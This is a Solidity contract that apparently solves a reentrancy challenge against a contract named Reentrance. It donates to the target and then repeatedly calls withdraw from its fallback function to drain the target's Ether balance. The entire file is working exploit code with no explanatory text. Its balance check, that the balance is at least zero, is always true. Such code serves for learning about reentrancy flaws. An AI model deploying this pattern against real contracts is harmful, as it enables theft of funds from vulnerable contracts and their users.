// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Reentrance.sol";

contract ReentranceAttack {

    Reentrance reentranceContract;

    constructor(address payable _reentranceContractAddress) {
        reentranceContract = Reentrance(_reentranceContractAddress);
    }

    function attack() external payable {
        reentranceContract.donate{value: 2000000000000000, gas: 40000000}(address(this));
        reentranceContract.withdraw(500000000000000);
    }

    fallback() external payable {
        if(address(reentranceContract).balance >= 0) {
            reentranceContract.withdraw(500000000000000);
        }
    }
}